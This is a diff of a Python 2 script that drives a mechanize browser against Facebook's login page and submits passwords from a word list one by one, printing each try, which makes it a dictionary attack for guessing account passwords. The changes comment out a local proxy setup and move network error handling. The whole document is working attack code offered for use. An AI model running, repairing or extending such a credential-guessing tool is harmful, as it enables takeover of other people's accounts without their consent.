@@ -96,15 +96,15 @@ def def_setup():
 			returns
 
 	# Setup the proxy.
-	proxy = urllib2.ProxyHandler({'http': '127.0.0.1:1234'})
-	opener = urllib2.build_opener(proxy)
-	urllib2.install_opener(opener)
+	#proxy = urllib2.ProxyHandler({'http': '127.0.0.1:1234'})
+	#opener = urllib2.build_opener(proxy)
+	#urllib2.install_opener(opener)
 
 	# Check if we have setup a proxy.
-	isProxy = raw_input("Please setup your proxy on http://127.0.0.1:1234 Type [Y]: ")
-	if isProxy == 'Y' or isProxy == 'y' or isProxy == 'yes' or isProxy == 'Yes':
+	#isProxy = raw_input("Please setup your proxy on http://127.0.0.1:1234 Type [Y]: ")
+	#if isProxy == 'Y' or isProxy == 'y' or isProxy == 'yes' or isProxy == 'Yes':
 
-		color_print("[+] Proxy setup on http://127.0.0.1:1234", color='green')
+	#	color_print("[+] Proxy setup on http://127.0.0.1:1234", color='green')
 
 	# Set the socket timeout.
 	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 100
@@ -134,8 +134,14 @@ def def_setup():
 
 	# Open up the facebook page.
 	url = 'http://www.facebook.com/login.php'
-	browser.open(url)
-	browser.select_form(nr = 0)
+	try:
+		browser.open(url)
+		browser.select_form(nr = 0)
+	except urllib2.URLError as e:
+		color_print("[!] Stopped!!! something went wrong? Try resetting your network interface", e.code, color='red')
+		return
+			
+			
 
 
 #
@@ -173,11 +179,8 @@ def def_login():
 			# Print out the tries
 	      		color_print("\n[*] Trying password {}".format(line.strip()), color='yellow')
 
-			# Try to Submit
-			try:
- 				request = browser.submit()
-			except urllib2.URLError, e:
-				color_print("[!] Stopped!!! something went wrong? Try resetting your network interface", e, color='red')
+			# Submit the form.
+ 			request = browser.submit()
 			
 
 			# Declare a BeautifulSoup Object.
